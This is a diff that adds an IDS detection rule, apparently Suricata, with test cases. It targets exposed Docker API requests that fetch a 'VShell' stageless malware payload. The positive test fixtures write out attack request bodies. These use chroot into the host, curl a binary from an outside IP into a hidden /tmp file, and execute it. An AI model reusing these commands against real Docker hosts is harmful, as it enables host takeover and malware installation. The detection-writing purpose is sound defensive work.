@@ -1,0 +1,55 @@
+name: "MALWARE Docker API Container Command Requesting VShell Stageless Payload"
+
+rule: >-
+  alert http any any -> $HOME_NET 2375
+  (msg:"MALWARE Docker API Container Command Requesting VShell Stageless Payload";
+  flow:to_server,established;
+  http.method; content:"POST";
+  http.uri; content:"/containers/";
+  http.request_body; content:"/api/download/stageless"; fast_pattern;
+  content:"Token:";
+  classtype:trojan-activity;
+  sid:1000898004; rev:1;
+  metadata:created_at 2026_10_21, deployment Internal;)
+
+tests:
+  - name: "positive-docker-create-stageless-download"
+    expected_sids: [1000898004]
+    request:
+      client_ip: 120.227.95.106
+      server_ip: 10.0.0.25
+      port: 2375
+      method: POST
+      uri: "/containers/create?name=zz_p11"
+      host: "10.0.0.25:2375"
+      headers:
+        User-Agent: "python-requests/2.33.0"
+        Content-Type: "application/json"
+      body: "{\"Image\":\"alpine:3.19\",\"Cmd\":[\"sh\",\"-c\",\"chroot /host /bin/sh -c 'curl -s --max-time 40 -H \\'Token: REDACTED\\' \\'http://92.119.178.59:18083/api/download/stageless?arch=linux_amd64&id=1&upx=false\\' -o /tmp/.sysd; chmod 755 /tmp/.sysd; /tmp/.sysd'\"]}"
+
+  - name: "positive-docker-exec-stageless-download"
+    expected_sids: [1000898004]
+    request:
+      client_ip: 120.227.95.106
+      server_ip: 10.0.0.25
+      port: 2375
+      method: POST
+      uri: "/containers/8f94e2c1/exec"
+      host: "10.0.0.25:2375"
+      headers:
+        User-Agent: "python-requests/2.33.0"
+        Content-Type: "application/json"
+      body: "{\"AttachStdout\":true,\"Cmd\":[\"/bin/sh\",\"-c\",\"curl -s --max-time 40 -H 'Token: REDACTED' 'http://92.119.178.59:18083/api/download/stageless?arch=linux_amd64&id=1&upx=false' -o /tmp/.sysd\"]}"
+
+  - name: "negative-benign-docker-create"
+    expected_sids: []
+    request:
+      client_ip: 10.0.0.10
+      server_ip: 10.0.0.25
+      port: 2375
+      method: POST
+      uri: "/containers/create?name=web"
+      host: "10.0.0.25:2375"
+      headers:
+        Content-Type: "application/json"
+      body: "{\"Image\":\"nginx:alpine\",\"Cmd\":[\"nginx\",\"-g\",\"daemon off;\"]}"
